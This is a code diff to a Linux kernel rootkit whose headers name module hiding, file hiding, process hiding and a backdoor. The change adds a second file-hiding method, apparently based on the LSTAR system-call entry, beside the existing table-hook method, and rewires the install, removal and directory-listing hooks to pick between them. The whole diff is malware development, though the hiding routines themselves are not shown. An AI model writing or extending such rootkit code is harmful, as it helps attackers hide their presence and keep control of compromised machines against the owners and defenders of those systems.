@@ -16,6 +16,7 @@
 #include "rootkit.h"
 #include "modhide.h"
 #include "filehide.h"
+#include "filehide_lstar.h"
 #include "backdoor.h"
 #include "pidhide.h"
 #include "openhide.h"
@@ -79,8 +80,10 @@ init_hooks(void)
     if (rootkit.hiding_module)
         hide_module();
 
-    if (rootkit.hiding_files)
+    if (rootkit.hiding_files == FH_TABLE)
         hide_files();
+    else if (rootkit.hiding_files == FH_LSTAR)
+        hide_files_lstar();
 
     if (rootkit.hiding_open)
         hide_open();
@@ -110,8 +113,10 @@ remove_hooks(void)
     if (rootkit.hiding_module)
         unhide_module();
 
-    if (rootkit.hiding_files)
+    if (rootkit.hiding_files == FH_TABLE)
         unhide_files();
+    else if(rootkit.hiding_files == FH_LSTAR)
+        unhide_files_lstar();
 
     if (rootkit.hiding_open)
         unhide_open();
@@ -221,7 +226,7 @@ g7_getdents(const struct pt_regs *pt_regs)
     inode_list_t_ptr hi_head, hi_tail;
     hi_head = hi_tail = &hidden_inodes;
 
-    if (rootkit.hiding_files) {
+    if (rootkit.hiding_files == FH_TABLE) {
         struct list_head *i;
         list_for_each(i, &kdirent_dentry->d_subdirs) {
             unsigned long inode;
@@ -302,7 +307,7 @@ g7_getdents64(const struct pt_regs *pt_regs)
     inode_list_t_ptr hi_head, hi_tail;
     hi_head = hi_tail = &hidden_inodes;
 
-    if (rootkit.hiding_files) {
+    if (rootkit.hiding_files == FH_TABLE) {
         struct list_head *i;
         list_for_each(i, &kdirent_dentry->d_subdirs) {
             unsigned long inode;
